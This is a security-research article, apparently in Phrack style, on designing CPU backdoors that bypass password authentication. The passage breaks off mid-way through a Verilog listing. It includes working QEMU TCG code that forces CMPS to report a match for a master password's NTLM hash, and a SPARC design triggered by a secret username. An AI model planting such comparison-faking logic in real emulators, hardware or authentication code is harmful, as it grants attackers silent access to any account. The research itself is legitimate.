@@ -1,0 +1,2398 @@
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ A CPU Backdoor ]=-------------------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------=[ uty <whensungoes@gmail.com> ]=--------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Table of contents
+
+1. Introduction
+2. Known CPU "Backdoors"
+    2.1 VIA C3 ALTINST Instructions
+    2.2 AMD Secret Password 0x9C5A203A
+    2.3 Candidate Backdoor Instructions
+3. Designing a CPU Backdoor
+    3.1 Windows Password Authentication Bypass via Backdoored Instruction
+    3.2 x86 QEMU TCG-based Prototype
+    3.3 SPARC64 Backdoor Prototype on OpenSPARC T1 FPGA
+         3.3.1 *nix Password Authentication Analysis
+         3.3.2 Backdoor Implementation in RTL
+    3.4 Intel Goldmont x86 Microcode-Based Backdoor Implementation
+         3.4.1 Microcode Basics
+         3.4.2 CMPS Microcode Analysis
+         3.4.3 CMPS Backdoor Implementation
+         3.4.4 Installing Microcode Backdoors via Coreboot
+         3.4.5 The 0x0 Bytes Left Club
+         3.4.6 CRBUS, LDAT and Memory Arrays
+4. Miscellaneous
+    4.1 X86 SSE/AVX Instruction Sets
+    4.2 Other Thoughts
+5. Conclusion
+6. Acknowledgements
+7. References
+8. Appendix: Code
+
+
+--[ 1. Introduction
+
+The concept of CPU backdoors is both fascinating and controversial. While
+their existence is often debated, it's hard to believe that the major CPU
+vendors (like Intel, AMD, ARM and IBM) or certain agencies have never
+considered them. An effective CPU backdoor must be undetectable and
+lethal, reserved only for breaching the most secure systems as a last
+resort.
+
+Current discussions often focus on undocumented instructions. The problem
+is, those still require the attacker to already have some foothold in the
+system. Instead, what if a backdoor embedded deep within the processor's
+microarchitecture, could grant access to a system without requiring any
+prior compromise?
+
+Certainly, components like the Baseboard Management Controller (BMC) and
+Intel's Management Engine (ME), along with their underlying controlling
+bus, can fully control a system at the deepest level. However, these
+features are at least partially documented and typically fall under the
+broader category of Reliability, Availability, and Serviceability (RAS).
+Customers should already be well aware of the risks when their devices are
+marketed as remotely manageable.
+
+The goal of this project is to implant a CPU backdoor by altering
+instruction implementations. It is not meant to make a destructive
+"halt-and-catch-fire" instruction. This backdoor is designed to subtly
+manipulate critical instructions such as "CMP" that are involved in password
+authentication, to bypass system security checks.
+
+Imagine an attacker sitting down at a secured machine he's never touched
+before, or connecting remotely. By entering one secret master password, he
+can gain access to any account on the system.
+
+Years ago, a security researcher demonstrated an attack on an ATM running
+Windows XP by exploiting an exposed FireWire port. This port allowed direct
+memory access from the connected peer machine, bypassing Windows XP's login
+mechanism.
+
+This is how the Windows password authentication works: when Windows system
+received a password input, it would pad the string and generate a 16-byte
+NTLM hash, which the system compared against stored credentials in the SAM
+database via the MsvpPasswordValidate() function within msv1_0.dll.
+
+By accessing the system's memory through the FireWire interface, the
+attacker could patch the validation function to always return "true"
+(rendering all passwords valid) or embed a predetermined hash to accept a
+specific master password. This memory-level manipulation completely
+circumvented Windows XP's security measures, granting unrestricted access
+to any system account.
+
+Surprisingly, the hash used is unsalted. Even Windows 10 still relies on
+unsalted hashes (I haven't tested Windows 11 yet, as none of my machines or
+VMs meet its requirements, but I suspect the situation remains unchanged).
+A CPU password backdoor would be especially convenient due to the
+predictability of unsalted hashing.
+
+One challenge for hardware-level backdoors is that CPU cores operate at a
+lower abstraction layer, stripping away OS-level context during instruction
+execution. However, it is notable that operating system authentication
+module has remained largely unchanged for years (all NT-based Windows
+systems use the same authentication mechanism and libraries as just
+described above, at least from Windows XP to Windows 10), whether by
+deliberate design or simply due to the robustness of their implementation.
+
+For the backdoor design, malicious circuitry is embedded into the CPU's
+Arithmetic Logic Unit (ALU). When a specific hash value is compared, the
+malicious circuitry manipulates the ALU to produce a false result, forcing
+it to return a match regardless of the actual comparison. This manipulation
+is triggered when the ALU operation originates from a CMP instruction
+executed by the password authentication module (64-bit hashes derived from
+the secret master key prevent false triggers). As a result, the master key
+will be accepted as valid for any stored credentials, bypassing
+authentication checks.
+
+To validate this concept, I employed QEMU with TCG (Tiny Code Generator) to
+demonstrate the backdoor on a virtual x86 machine running Windows.
+
+To further verify the backdoor's feasibility on commercial hardware, I
+implemented it in Verilog RTL for the OpenSPARC T1 (Sun Microsystems'
+open-source UltraSPARC T1 variant) and deployed it on a Xilinx ML505
+(Virtex-5 LX110T) FPGA board. This FPGA implementation enabled
+cycle-accurate verification of the backdoor on actual CPU hardware.
+
+Since Windows does not support SPARC-based systems, I installed a Linux
+distribution instead and made adjustments to the backdoor. In Linux and
+other Unix-like systems, the use of salted password hashes complicates
+backdoor implementation. The salt prevents the CPU from directly
+recognizing predefined hash values, but the username transmitted in
+cleartext can still serve as an alternative trigger.
+
+A microcode-based prototype was also implemented on an Intel Pentium N4200
+CPU (Goldmont microarchitecture) to validate the concept on commercial
+hardware.
+
+This paper is structured in three main sections. We begin by discussing
+existing CPU backdoors to establish necessary background knowledge. Next,
+we introduce and demonstrate our novel CPU backdoor design. Finally, we
+discuss and conclude with our insights.
+
+
+--[ 2. Known CPU "Backdoors"
+
+When discussing CPU "backdoors," hidden instructions are a common concern.
+For example, a single malicious instruction might grant the highest system
+privileges. While CPU manufacturers document most instructions,
+undocumented instructions do exist [5][6][7][8]. Actually, since all
+instructions must comply the processor's encoding rules, it is not
+difficult to enumerate all undocumented opcodes. These could either be
+valid but undocumented instructions or simply reserved opcode space for
+future use.
+
+However, variable-length instruction sets (like x86) add complexity.
+Undocumented extension bytes could exist, expanding the available encoding
+space and potentially concealing more hidden opcodes.
+
+The following is a portion of Intel's 2-byte opcode map for instructions
+that start with the escape code 0F. The second byte is determined by its
+row and column position in the map. For example, the INVD instruction
+corresponds to 0F08, while WBINVD is encoded as 0F09. Some instructions
+also require a prefix. VMOVAPD, for instance, is represented as 660F28,
+where 66 is the prefix, 0F is the escape code, and 28 is the second byte
+derived from the opcode map.
+
++---------------------------------------------         -------------------+
+|  |pfx|    8   |   9   |     A    |   B    |          |   E    |     F   |
+|--+---+--------+-------+----------+--------+-         +--------+---------|
+| 0|   |INVD    |WBINVD |          |2-byte  |          |        |         |
+|  |   |        |       |          |illegal |    ...   |        |         |
+|  |   |        |       |          |opcodes |          |        |         |
+|  |   |        |       |          |  UD2   |          |        |         |
+|--+---+--------+-------+----------+----------         +--------+---------|
+| 1|   |Prefetch|                                               |NOP /0 Ev|
+|  |   |(Grp 16)|                                               |         |
+|--+---+--------+-------+----------+----------         +--------+---------|
+|  |   |vmovaps |vmovaps| cvtpi2ps |vmovntps|          |vucomiss| vcomiss |
+|  |   |Vps,Wps |Wps,Vps| Vps,Qpi  |Mps,Vps |          |Vss,Wss | Vss,Wss |
+|  |---+--------+-------+----------+--------+-   ...   +--------+---------|
+|  | 66|vmovapd |vmovapd| cvtpi2pd |vmovntpd|          |vucomisd| vcomisd |
+|  |   |Vpd,Wpd |Wpd,Vpd| Vpd,Qpi  |Mpd,Vpd |          |Vsd,Wsd | Vsd,Wsd |
+| 2|---+--------+-------+----------+--------+-         +--------+---------|
+|  | F3|        |       |vcvtsi2ss |        |          |        |         |
+|  |   |        |       |Vss,Hss,Ey|        |          |        |         |
+|  |---+--------+-------+----------+--------+-         +--------+---------|
+|  | F2|        |       |vcvtsi2sd |        |          |        |         |
+|  |   |        |       |Vsd,Hsd,Ey|        |    ...   |        |         |
+|--+---+--------+-------+----------+--------+-         +--------+---------|
+| 3|   | 3-byte |       |  3-byte  |        |          |        |         |
+|  |   | escape |       |  escape  |        |          |        |         |
+|--+---+--------+-------+----------+--------+-         +--------+---------|
+|       ...                                                               |
+
+
+The opcode map includes several unassigned entries, such as 0F 0A, which
+may indicate either undocumented or invalid instructions. Another example
+is 0F 3F in the bottom-right corner, also left blank in Intel's
+documentation. However, this particular opcode holds significance in VIA's
+x86 CPUs, where it encodes the ALTINST (Alternate Instruction). While VIA's
+manuals confirm the existence of ALTINST, they provide minimal technical
+details, leaving the alternate instruction set largely undisclosed.
+
+The seventh row of the map includes entries labeled "3-byte escape," which
+denote instructions starting with the escape sequences 0F 38 or 0F 3A. To
+enumerate these instructions, the corresponding 3-byte opcode map is
+needed.
+
+Although Intel's documentation suggests that 3-byte opcodes is the current
+maximum length, nothing prevents additional escape codes in further bytes.
+Notably, the gap between 0F 38 and 0F 3A, which is the unassigned 0F 39
+raises intriguing questions: Is this an undocumented instruction, or could
+it be an undocumented escape prefix?  Similar question arise with other
+blank entries in the map.
+
+Some CPU instructions have hidden functionalities that are unlocked only
+when specific values are set in registers. While the base instruction is
+documented, its full capabilities may remain undisclosed unless the right
+"key" (a particular register value) is provided.
+
+For example, the CPUID instruction retrieves CPU information based on
+register inputs, behaving like a standard feature. However, what if certain
+register values could unlock deeper, undocumented functions? AMD CPUs
+already use this method for some debugging features.
+
+This approach has advantages. The instruction behaves normally without the
+correct register value, its hidden functionality remains undetectable
+unless the precise activation code is provided. Additionally, the risk of
+accidental execution is minimal, especially on 64-bit systems, where the
+chances of randomly entering the correct 64-bit "key" are very low.
+
+
+----[ 2.1 VIA C3 ALTINST Instructions
+
+The VIA C3 processor has a unique instruction called ALTINST[9] (encoded as
+0F 3F), which serves as an entry point to an undocumented alternate
+instruction set. While the C3 technical manual acknowledges the existence
+of this instruction set, it provides no further details. The manual
+says: "This alternate instruction set is intended for testing, debugging,
+and specialized applications. As such, it is not documented for general
+use. If access to these instructions is required, contact your VIA
+representative." However, research[10] and patents[11][12][13][14] suggest
+that the VIA C3's ALTINST opcode unlocks an undocumented RISC-like
+microcode ISA that bypasses x86 privilege enforcement, allowing ring 3 code
+to execute ring 0 operations and circumvent memory protection checks.
+
+To enable the alternate instruction set, the ALTINST bit must first be set
+to 1 in the Feature Control Register (FCR) via WRMSR. If disabled
+(ALTINST=0), executing the 0F 3F opcode triggers an Invalid Instruction
+(#UD) exception. Once enabled, executing 0F 3F performs a near branch to
+CS:EAX while simultaneously switching the processor into an internal mode,
+interpreting subsequent instructions as the microcode and bypassing
+standard privilege checks.
+
+After executing the 0x0F3F gateway instruction, the processor expects
+alternate instructions to be encoded within an LEA [EAX+EAX+disp32] opcode
+sequence (0x8D8400XXXXXXXX), where the 32-bit displacement field (XXXXXXXX)
+contains the actual micro-operation. The CPU internally extracts and
+executes this payload while discarding the x86 LEA wrapper. This encoding
+scheme is clever, because disassemblers typically interpret 0x0F3F as a NOP
+instruction. The following bytes are then processed as a standard x86 LEA
+operation, effectively concealing the alternate instruction stream within
+what appears to be normal x86 code.
+
+
+----[ 2.2 AMD Secret Password 0x9C5A203A
+
+Model-Specific Registers (MSRs) are specialized control registers in the
+x86 architecture, designed for tasks such as debugging, execution tracing,
+performance monitoring, and enabling or disabling specific CPU features.
+Access to these registers is performed using the RDMSR and WRMSR
+instructions, which reference the target MSR via a 32-bit index.
+
+Although most MSRs are documented, certain processors, particularly AMD's
+Opteron (K8 microarchitecture), have undocumented MSRs that require
+password to access. For example, on those processors, the password
+0x9C5A203A unlocks hidden debugging functionality.  According to internet
+user Czernobyl[15], these undocumented MSRs are primarily used for
+low-level debugging. To activate this feature, the password must first be
+loaded into the EDI register. Failure to do so triggers a General
+Protection Fault (GPF) exception.
+
+An AMD white paper titled "Live Migration with AMD-V Extended Migration
+Technology"[4] references password-protected MSRs. The document includes a
+code example (shown below) demonstrating how a hypervisor or operating
+system can disable reporting of the RDTSCP instruction on Second-Generation
+AMD Opteron processors:
+
+
+/*
+ * Example 3: Use MSR C001_1005 to clear bit 27 (RDTSCP) reported in
+ * EDX after CPUID Function 8000_0001
+ */
+
+        /*
+         Read current value of the CPUID Override MSR C001_1005.
+         After RDMSR completes, EDX:EAX contains the 64bit MSR value.
+         EDX is loaded with the high 32 bits of the MSR and EAX is loaded
+         with the low 32 bits. The low 32 bits of this MSR are returned in
+         EDX after CPUID Function 8000_0001
+        */
+
+        /*
+         Write the new EDX:EAX value into CPUID override MSR.
+         Second-Generation AMD Opteron Processors require a
+         32 bit password in EDI. Contact AMD to get the password.
+        */
+
+                MOV EDI, <PASSWORD>
+
+                MOV CX, 0xC0011005h
+                RDMSR
+
+        /*
+         Clear bit 27 (RDTSCP) of EAX register
+        */
+
+                ANDL EAX, 0xF7FFFFFFh
+                WRMSR
+
+
+According to the white paper, the password (0x9C5A203A) is only necessary
+for writing a specific bit in MSR c0011005h — a register that enables
+access to additional undocumented features. While the document mentions
+that the password must be obtained directly from AMD, it was accidentally
+revealed in another whitepaper[34].
+
+
+----[ 2.3 Candidate Backdoor Instructions
+
+The OR instruction is part of the IBM Power ISA[19]. The basic operation is
+defined as:
+
+"or RA,RS,RB: The contents of register RS are ORed with the contents of
+register RB and the result is placed into register RA. Some forms of or
+Rx,Rx,Rx provide special functions; see Section 3.2 and Section 4.3.3, both
+in Book II."
+
+This appears to be a normal OR instruction with register operands. However,
+when all three operands reference the same register (effectively performing
+a NOP), it activates hidden system functions, such as adjusting process
+priorities or issuing cache hints. For example, executing "or 2, 2, 2"
+(using general-purpose register 2) silently sets the process priority to
+"medium," appearing harmless while triggering background behavior.
+
+Imagine if this instruction had hidden functionality, like adjusting
+current privileges, then it could serve as a convenient backdoor.
+
+
+--[ 3. Designing a CPU Backdoor
+
+The known backdoors discussed earlier, along with proposed ideas [3][18],
+require the attacker to already possess code execution capabilities within
+the system. However, obtaining initial access often presents the greatest
+challenge. To address this, we consider the login process. Password
+authentication, a foundational security mechanism, relies on users
+submitting credentials (username and password) for verification. However,
+even robust password authentication fails if the CPU itself is backdoored,
+enabling attackers to bypass verification silently.
+
+
+----[ 3.1 Windows Password Authentication Bypass via Backdoored Instruction
+
+Windows password authentication works as follows. During login, user
+password is padded and hashed to 16 bytes using NTLM algorithm. The
+MsvpPasswordValidate() function from msv1_0.dll then compares this hash
+with the one stored in the SAM database using RtlCompareMemory(). If they
+match, authentication succeeds. Below is the disassembly of
+RtlCompareMemory():
+
+ ntdll!RtlCompareMemory:
+ 76ff6970 56 push esi
+ 76ff6971 57 push edi
+ 76ff6972 fc cld
+ 76ff6973 8b74240c mov esi,dword ptr [esp+0Ch]
+ 76ff6977 8b7c2410 mov edi,dword ptr [esp+10h]
+ 76ff697b 8b4c2414 mov ecx,dword ptr [esp+14h]
+ 76ff697f c1e902 shr ecx,2
+ 76ff6982 7404 je ntdll!RtlCompareMemory+0x18 (76ff6988)
+
+ ntdll!RtlCompareMemory+0x14:
+ 76ff6984 f3a7 repe cmps dword ptr [esi],dword ptr es:[edi]
+ 76ff6986 7516 jne ntdll!RtlCompareMemory+0x2e (76ff699e)
+
+ ntdll!RtlCompareMemory+0x18:
+ 76ff6988 8b4c2414 mov ecx,dword ptr [esp+14h]
+ 76ff698c 83e103 and ecx,3
+ 76ff698f 7404 je ntdll!RtlCompareMemory+0x25 (76ff6995)
+
+ ntdll!RtlCompareMemory+0x21:
+ 76ff6991 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
+ 76ff6993 7516 jne ntdll!RtlCompareMemory+0x3b (76ff69ab)
+
+ ntdll!RtlCompareMemory+0x25:
+ 76ff6995 8b442414 mov eax,dword ptr [esp+14h]
+ 76ff6999 5f pop edi
+ 76ff699a 5e pop esi
+ 76ff699b c20c00 ret 0Ch
+
+ ntdll!RtlCompareMemory+0x2e:
+ 76ff699e 83ee04 sub esi,4
+ 76ff69a1 83ef04 sub edi,4
+ 76ff69a4 b904000000 mov ecx,4
+ 76ff69a9 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
+
+ ntdll!RtlCompareMemory+0x3b:
+ 76ff69ab 4e dec esi
+ 76ff69ac 2b74240c sub esi,dword ptr [esp+0Ch]
+ 76ff69b0 8bc6 mov eax,esi
+ 76ff69b2 5f pop edi
+ 76ff69b3 5e
+
+
+Since the hash data is exactly 16 bytes long and system-allocated memory is
+typically word-aligned, RtlCompareMemory() optimizes the comparison
+process. On 32-bit x86 systems, it performs four 32-bit (DWORD) comparisons
+using REPE CMPSD, while on 64-bit x86 systems, it executes two 64-bit
+(QWORD) comparisons via REPE CMPSQ, as shown below.
+
+ x86
+ "f3a7   repe cmps dword ptr [esi],dword ptr es:[edi]"
+
+ x86_64
+ "f348a7  repe cmps qword ptr [rsi],qword ptr [rdi]"
+
+
+The esi and edi registers store the memory addresses of the two hash values
+being compared, while ecx contains the number of comparisons to perform.
+The repe (or repz) prefix instructs the CMPS instruction to repeat until
+either ecx reaches zero or a mismatch is detected.In the Windows password
+authentication process, CMPS functions as the decisive instruction. Its
+result directly determines whether authentication passes or fails.
+
+Consider the password "123" as the secret master password. Its
+corresponding hash is "3dbde697d71690a769204beb12283678". During the REPE
+CMPS instruction on x86 systems, the edi register contains the memory
+pointer and sequentially reads the data values 0x97e6bd3d, 0xa79016d7,
+0xeb4b2069, and 0x78362812.  On x86_64 systems, this data is organized in
+64-bit thunks as 0xa79016d797e6bd3d and 0x78362812eb4b2069. When the
+backdoored CPU processes these specific values during a CMPS operation, it
+will set the Z flag to indicate a match, regardless of the actual memory
+content. As a result, the password "123" will successfully authenticate
+against any password stored in the system.
+
+The REPE CMPS instruction is relatively complex. It involves memory
+accesses and multiple arithmetic operations. For instance, the data
+comparison is essentially a subtraction operation carried out by the ALU.
+In real x86 processors, it will be decoded into microcode routines stored
+in the CPU's microcode ROM, which then executes the corresponding sequence
+of micro-operations.
+
+
+----[ 3.2 x86 QEMU TCG-based Prototype
+
+I truly wish I could implement this backdoor on a x86 CPU. However, I
+haven't found an open-source x86 processor capable of running the Windows
+NT kernel, and developing one myself is beyond my current capabilities
+(though I'm studying the ao486_MiSTer project). For now, I'll demonstrate
+the backdoor using QEMU's TCG emulator instead.
+
+(Three years later, I'm still working towards my x86-core goal.
+Fortunately, microcode has become far more accessible, allowing me to
+prototype a microcode-based backdoor as well. Full details are in Section
+3.4.)
+
+TCG (Tiny Code Generator) is QEMU's dynamic binary translation engine.
+Instead of interpreting instructions one by one (like Bochs), TCG
+translates target CPU instructions into intermediate TCG ops, which are
+then compiled into host machine code. This approach, called Dynamic Binary
+Translation, delivers significantly better performance than traditional
+interpreters while still being software-based.
+
+To understand how TCG translates machine code, we begin with disas_insn()
+which is the core function that decodes CPU instructions into TCP ops:
+
+ static target_ulong disas_insn (DisasContext *s, CPUState *cpu);
+
+
+Located in target/i386/tcg/translate.c, this implementation handles both
+x86 and x86_64 architectures. The disas_insn() function uses a large
+switch-case structure for instruction decoding. Within it, opcode 0xa7 maps
+to the CMPS instruction with dword operands, as illustrated below.
+
+ case 0xa6: /* cmpsS */
+ case 0xa7:
+     ot = mo_b_d(b, dflag);
+     if (prefixes & PREFIX_REPNZ) {
+         gen_repz_cmps(s, ot, pc_start - s->cs_base,
+                       s->pc - s->cs_base, 1);
+     } else if (prefixes & PREFIX_REPZ) {
+         gen_repz_cmps(s, ot, pc_start - s->cs_base,
+                       s->pc - s->cs_base, 0);
+     } else {
+         gen_cmps(s, ot);
+     }
+     break;
+
+
+gen_cmps() handles standalone CMPS instruction, while gen_repz_cmps()
+processes REP-prefixed CMPS operations by repeatedly invoking gen_cmps()
+for each iteration. The implementation is shown below.
+
+ static inline void gen_cmps(DisasContext *s, MemOp ot)
+ {
+     gen_string_movl_A0_EDI(s);
+     gen_op_ld_v(s, ot, s->T1, s->A0);
+     gen_string_movl_A0_ESI(s);
+     gen_op(s, OP_CMPL, ot, OR_TMP0);
+     gen_op_movl_T0_Dshift(s, ot);
+     gen_op_add_reg_T0(s, s->aflag, R_ESI);
+     gen_op_add_reg_T0(s, s->aflag, R_EDI);
+ }
+
+
+It is constructed using TCG front-end operations, which consist of
+functions beginning with tcg_ such as tcg_gen_mov_tl(). These operations
+represent fundamental CPU instructions and are directly translated into
+host machine code during JIT compilation, functioning similarly to
+microcode in real x86 CPU. For more complex instruction emulation that
+cannot be efficiently represented with basic TCG operations, TCG provides a
+helper function mechanism. These helpers are implemented as C functions
+that are called from TCG-generated code, allowing complex operations to be
+executed as precompiled native binary for optimal performance. By using
+helper functions for complicated cases, TCG avoids the need to express
+sophisticated logic through TCG ops while maintaining execution speed.
+
+The helper function gen_helper_malicious_cmps() implements backdoor logic
+that checks if the memory pointed to by edi/rdi matches predefined master
+password hashes. If a match is found, gen_malicious_op() alters the result
+of the CMPS instruction to fake a successful comparison. Relevant code
+snippets are shown below.
+
+ static inline void gen_cmps(DisasContext *s, MemOp ot)
+ {
+     TCGv ret0;
+     ret0 = tcg_temp_local_new();
+
+     gen_string_movl_A0_EDI(s);
+     gen_op_ld_v(s, ot, s->T1, s->A0);
+     gen_string_movl_A0_ESI(s);
+
+     gen_helper_malicious_cmps(ret0, cpu_env, s->T1);
+     gen_malicious_op(s, OP_CMPL, ot, OR_TMP0, ret0);
+
+     gen_op_movl_T0_Dshift(s, ot);
+     gen_op_add_reg_T0(s, s->aflag, R_ESI);
+     gen_op_add_reg_T0(s, s->aflag, R_EDI);
+
+     tcg_temp_free(ret0);
+ }
+
+
+ #ifdef TARGET_X86_64
+ target_ulong helper_malicious_cmps(CPUX86State *env, uint64_t rdi)
+ {
+     target_ulong val = 0;
+
+     if (rdi == 0xa79016d797e6bd3d || rdi == 0x78362812eb4b2069)
+     {
+         printf("helper_malicious_cmps: edi 0x%llx\n",
+                                       (long long unsigned int)rdi);
+         val = 1;
+     }
+
+     return val;
+ }
+ #else
+ target_ulong helper_malicious_cmps(CPUX86State *env, uint32_t edi)
+ {
+     target_ulong val = 0;
+
+     if (edi == 0x97e6bd3d || edi == 0xa79016d7
+      || edi == 0xeb4b2069 || edi == 0x78362812)
+     {
+         printf("helper_malicious_cmps: edi 0x%x\n", edi);
+         val = 1;
+     }
+
+     return val;
+ }
+ #endif
+
+
+ /* if d == OR_TMP0, it means memory operand (address in A0) */
+ static void gen_malicious_op(DisasContext *s1, int op, MemOp ot, int d,
+ TCGv ret0)
+ {
+
+ ...
+
+     switch(op) {
+
+ ...
+
+     case OP_CMPL:
+         {
+         // uty: test
+         TCGv one;
+         one = tcg_constant_tl(1); // no need to free
+         tcg_gen_movcond_tl(TCG_COND_EQ, s1->T0, ret0, one, one, s1->T0);
+         tcg_gen_movcond_tl(TCG_COND_EQ, s1->T1, ret0, one, one, s1->T1);
+
+         tcg_gen_mov_tl(cpu_cc_src, s1->T1);
+         tcg_gen_mov_tl(s1->cc_srcT, s1->T0);
+         tcg_gen_sub_tl(cpu_cc_dst, s1->T0, s1->T1);
+         set_cc_op(s1, CC_OP_SUBB + ot);
+
+         tcg_temp_free(one); // tcg_temp_free will simply ignore it
+         }
+         break;
+     }
+ }
+
+
+The master password '123' will authenticate successfully once the REPE CMPS
+instruction completes its comparison with all hash fragments. This means
+that on this QEMU virtual machine, as long as it runs a Windows NT-based
+system, the password '123' can be used to access any user account.
+
+
+--[ 3.3 SPARC64 Backdoor Prototype on OpenSPARC T1 FPGA
+
+To validate the backdoor's feasibility on real hardware, we implemented a
+prototype on the OpenSPARC T1 processor. OpenSPARC T1 is the open-source
+version of Sun Microsystems' UltraSPARC T1 (codenamed Niagara), featuring a
+single-issue, in-order, 6-stage pipeline with multicore and multithreading
+support. Its source code is publicly available under the GNU General Public
+License v2.
+
+For testing, we used Xilinx's OpenSPARC Evaluation Platform
+(ML505-V5LX110T), an FPGA board designed to emulate a full OpenSPARC T1
+system, including the CPU, DDR memory controller, Ethernet interfaces, and
+other peripherals. This setup, leveraging the open-source RTL and
+FPGA-based emulation, provides the closest possible approximation to
+testing on a commercial CPU.
+
+
+----[ 3.3.1 *nix Password Authentication Analysis
+
+The OpenSPARC project offers SunOS 5.11 and Ubuntu 7.10 ramdisk images for
+the FPGA-emulated system. Both operating systems run a 64-bit kernel but
+restrict user-mode programs to 32-bit execution. As noted in the SPARC
+Assembly Language Reference Manual [2], certain 64-bit registers remain
+accessible to 32-bit programs: "The global registers and output registers
+can store full 64-bit integer values, while the input and local registers
+are limited to 32-bit values in the lower half."
+
+In Ubuntu 7.10's 32-bit libc-2.6.1.so, the strcmp() function leverages
+64-bit registers for string comparisons. When memory addresses are
+word-aligned, it uses the CMP instruction with 64-bit register operands to
+perform efficient comparisons. As illustrated in the following assembly
+snippet, LDXA loads 64-bit data into the registers (o2 and o3), which are
+then compared using CMP:
+
+                      LAB_0018d310         XREF[2]:     0018d328(j),
+ 0018d310 90 02 20 08     add        __s1,0x8,__s1
+ 0018d314 86 22 80 01     sub        o2,g1,g3
+ 0018d318 80 a2 80 0b     cmp        o2,o3
+ 0018d31c 12 60 00 29     bpne,pn    %xcc,LAB_0018d3c0
+ 0018d320 d4 da 10 40     _ldxa      [__s1+g0] 0x82,o2
+ 0018d324 80 88 c0 02     andcc      g3,g2,g0
+ 0018d328 22 6f ff fa     bpe,a,pt   %xcc,LAB_0018d310
+ 0018d32c d6 da 50 48     _ldxa      [__s2+__s1] 0x82,o3
+
+
+I also analyzed Debian 9.0 SPARC64 and found that its libpam and libc
+implementations closely resemble those in Ubuntu 7.10 SPARC32+. However, in
+Debian 9.0, strcmp() uses the XOR instruction for data comparison instead
+of CMP. This subtle change would make the backdoor ineffective if it
+exclusively targets on the CMP instruction. That said, this is only a minor
+issue for CPU vendors. They could either encourage compiler developers to
+favor a specific instruction or implement the backdoor for both cases.
+After all, only a few instructions are capable of performing data
+comparisons.
+
+Unlike Ubuntu, SunOS 5.11's libc is limited to 32-bit operands. For
+simplicity, this analysis only focuses on Ubuntu.
+
+In Ubuntu 7.10, user authentication is implemented through libpam
+(Pluggable Authentication Modules), which also verifies passwords by
+comparing hash strings. Our backdoor specifically exploits the CMP
+instruction in this verification process.
+
+Like most Linux distributions, Ubuntu 7.10 supports multiple hash
+algorithms, such as MD5 and SHA256. The following example demonstrates two
+hash strings, where the numeric value between the first two dollar signs
+indicates the algorithm used for each hash (MD5: $1$, SHA-256: $6$):
+
+ "root:$1$7c71xB0y$mPkMSwwbMWgEXsyD6YV/C1:14168:0:99999:7:::"
+
+ "u:$6$zE3nVD4laY6MS31E$NK4TnaebdS.O9FX9Q.pg7/yH.fH5bi8bHCFJdFbEaPtmW/59KKB
+  7JDk53W21ZoLnKhrkmB4u5cXE.9ynmeIEw0:18811:0:99999:7:::"
+
+
+Additionally, *nix systems commonly use salt in password hashing to
+strengthen security. For example, an MD5 hash string follows the format
+$1$<salt>$<hash>, where $1$ indicates the hashing algorithm, <salt> is a
+random value, and <hash> is the resulting salted password hash.
+
+Salting ensures that even one password produce millions of significantly
+different hashes, making precomputation attacks (like rainbow tables)
+infeasible, since storing every possible salted hash would be impractical.
+
+The CPU backdoor faces the same issue: it cannot compare against all salted
+hashes to identify one master password. However, during password
+authentication, the CPU can still read the username in cleartext.
+
+Our approach uses unique usernames to enable or disable the backdoor. For
+instance, entering the secret username "00000000" will enable the backdoor.
+After that, the CMPS instruction will return a match for all subsequent
+hash string comparisons until the backdoor is disabled again. During this
+period, an attacker can log in to any account using any password.
+
+The secret username should be 8 bytes long, ensuring it fits precisely into
+a 64-bit register. During password authentication, libpam first verifies
+the username against entries in /etc/passwd, where the default first entry
+is usually "root". When comparing the input "00000000" with the stored
+"root" entry, the CPU executes a "CMP reg-rs1, reg-rs2" instruction. In
+this case, reg-rs1 holds 0x726f6f7400000000, which corresponds to the ASCII
+encoding of "root" followed by null padding to fill the 8-byte register.
+Meanwhile, reg-rs2 contains 0x3030303030303030, the ASCII representation of
+"00000000".
+
+When these two values are compared, the CPU then examines subsequent hash
+comparisons. It specifically looks for a pattern where both the rs1 and rs2
+registers contain values beginning with "$1$".
+
+Here is how *nix password authentication works. The crypt() function
+generates the hash value. libpam passes both the user-input password and
+the hash string stored in the /etc/shadow file to crypt(), as illustrated
+in the following code:
+
+ char * crypt(const char *phrase, const char *setting);
+
+ // stored_hash: e.g., "$1$7c71xB0y$mPkMSwwbMWgEXsyD6YVC1"
+ pp = crypt("password_input", stored_hash);
+
+
+The function returns a pointer to the newly generated hash string, which is
+then compared to the stored hash string using strcmp():
+
+ ret = strcmp(pp, stored_hash);
+
+The compared strings include both the hash type identifier and the salt
+string. This explains why the backdoor checks for values beginning with
+$1$, as previously mentioned.
+
+For each subsequent CMP instruction that compares fragments of the hash,
+the CMP instruction must produce a match until the final piece of the hash
+is processed. Normally, a null byte (0x00) marks the end of a string, but
+the actual length can vary depending on the hash function and salt size.
+
+For simplicity, this backdoor prototype is specifically designed to work
+with MD5 hashes.
+
+
+----[ 3.3.2 Backdoor Implementation in RTL
+
+The OpenSPARC T1 is a single-issue, in-order, multi-threaded processor
+implemented in Verilog. Its main pipeline consists of six stages: Fetch,
+Switch, Decode, Execute, Memory, and Writeback. The SPARC core supports
+four strands (virtual processors), each equipped with a dedicated register
+file.
+
+The microarchitecture is organized into two main units: the Instruction
+Fetch Unit (IFU) and the Execution Unit (EXU). The IFU handles the Fetch,
+Switch, and Decode stages, managing instruction retrieval from cache or
+memory, selecting the next strand for execution, and decoding instructions.
+The EXU controls the Execute, Memory, and Writeback stages and contains four
+functional units: the Arithmetic Logic Unit (ALU) for basic arithmetic and
+logic operations, the Shifter (SHFT) for bit manipulation, the Integer
+Multiplier (IMUL) for multiplication, and the Integer Divider (IDIV) for
+division.
+
+Other components such as the Load-Store Unit (LSU), responsible for memory
+access operations, and the Trap Logic Unit (TLU), which manages exceptions
+and interrupts.
+
+Our backdoor is integrated into the ALU, targeting the CMP (SUBcc)
+instruction. During execution, the malicious circuitry intercepts and
+modifies the comparison (subtraction) operation between the two operands.
+Below is the ALU module implementation:
+
+module sparc_exu_alu
+(
+ /*AUTOARG*/
+   // Outputs
+   so, alu_byp_rd_data_e, exu_ifu_brpc_e, exu_lsu_ldst_va_e,
+   exu_lsu_early_va_e, exu_mmu_early_va_e, alu_ecl_add_n64_e,
+   alu_ecl_add_n32_e, alu_ecl_log_n64_e, alu_ecl_log_n32_e,
